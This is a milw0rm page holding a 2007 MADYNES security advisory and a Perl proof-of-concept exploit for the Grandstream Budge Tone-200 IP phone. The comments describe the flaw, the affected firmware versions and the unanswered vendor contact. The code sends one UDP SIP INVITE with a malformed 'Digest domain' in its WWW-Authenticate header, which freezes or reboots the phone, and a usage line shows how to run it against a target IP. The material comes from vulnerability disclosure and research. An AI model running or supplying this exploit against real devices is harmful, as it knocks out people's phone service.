<html><head><title>Grandstream Budge Tone-200 IP Phone (Digest domain) DoS Exploit</title></head><pre>#!/usr/bin/perl
# MADYNES Security Advisory 
# http://madynes.loria.fr 
#
# Title: Grandstream Budge Tone-200 denial of service vulnerability 
#
# Release Date:  21/03/2007 
#
# Severity:      High - Denial of Service 
#
# Advisory ID:KIPH3 
#
# Hardware: Grandstream Budge Tone-200 IP Phone 
# http://www.grandstream.com/consumerphones.html 
#
# Affected Versions: Program-- 1.1.1.14 Bootloader-- 1.1.1.5 
#
# Other versions maybe. 
#
# Vulnerability Synopsis: After sending a crafted INVITE/CANCE or any 
# message with a &quot;WWW-Authenticate&quot; where the &quot;Digest domain&quot; is crafted 
# the device freezes provoking a DoS. 
#
# Impact: A remote individual can remotely crash and perform a Denial of 
# Service(DoS) attack in all the services provided by the software by 
# sending one crafted SIP INVITE message. This is conceptually similar to 
# the &quot;ping of death&quot;. 
#
# Resolution: The vendor was contacted at multiple times, the complete 
# report was sent, but no feedback whatsoever resulted. 
#
# Vulnerability Description: the device reboots after a crafted INVITE 
# message had been sent. 
#
# Configuration of our device: 
#
# Software Version: Program-- 1.1.1.14 Bootloader-- 1.1.1.5 
#
# IP-Address obtained by DHCP as 192.168.1.105 
#
# The configuration is the default 
#
# Vulnerability: 
#
# After sending a crafted INVITE, CANCEL or any message with a 
# &quot;WWW-Authenticate&quot; where the &quot;Digest domain&quot; is crafted the device 
# freezes provoking a DoS. 
#
# Credits:
# Humberto J. Abdelnur (Ph.D Student)
# Radu State (Ph.D)
# Olivier Festor (Ph.D)
# This vulnerability was identified by the Madynes research team at INRIA
# Lorraine, using the Madynes VoIP fuzzer.
# http://madynes.loria.fr/
# Exploit: 
#
# To run the exploit the file invite_grandstream.pl should be launched 
# (assuming our configurations) as: 
#
# perl invite_grandstream.pl 192.168.1.105 5060 Fosforito 
#
# Proof of Concept Code: 

use IO::Socket::INET;

die &quot;Usage $0 &lt;dst&gt; &lt;port&gt; &lt;username&gt;&quot; unless ($ARGV[2]);

 

$socket=new IO::Socket::INET-&gt;new(PeerPort=&gt;$ARGV[1],

        Proto=&gt;'udp',

        PeerAddr=&gt;$ARGV[0]);

 

$AUTH = &quot;WWW-Authenticate: Digest domain=\&quot;/-+:\@=\$\%D6\$;\$=;=\$=\$,\@\$.=;\@;;,&amp;&amp;+:::=\@/2\$&amp;;6+;+=\%A5==;\@:=;\$&amp;\%A3:u,\@=\@;&amp;;\@+::+&amp;;+,,&amp;/&amp;\@=,;=&amp;:&amp;,=&amp;:;:;;K+&amp;\@=\%DA*\$;\@&amp;+&amp;:;/==\%37:\%A6;,\@\%ED,:=:\@,;\%DA;&amp;\$)\$+=;+:\%FE\$:\@;&amp;=,W;,g\%EF;\%FB:+\@O\$+\%AF+;+:,&amp;=\%CA\%EA;\$,\@+/;\@,-;:;,P&amp;\@;_\$:\%C7&amp;+&amp;/!,\%EE\$:,\@:;;\@&amp;\@,+,z\@\$;\@\@\$\$::\@/=,\$3\%ED=\@+\%AE/=&amp;\@;;\$;&amp;\$\%FE:\@;\$+:\$\%EB\$=&amp;:;&amp;K&amp;;:\@\%EA,=\%BA6\%21;=&amp;:\$\&quot;\r\n&quot;;

$msg = &quot;INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.2;branch=z9hG4bK056a27e7;rport\r\nFrom: &lt;sip:tucu\@192.168.1.2&gt;;tag=as011d1185\r\nTo: &lt;sip:$ARGV[2]\@$ARGV[0]&gt;;$TOTAG\r\n$AUTH\CSeq: 6106 INVITE\r\Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n&quot;;

$socket-&gt;send($msg);

# milw0rm.com [2007-03-21]</pre></html>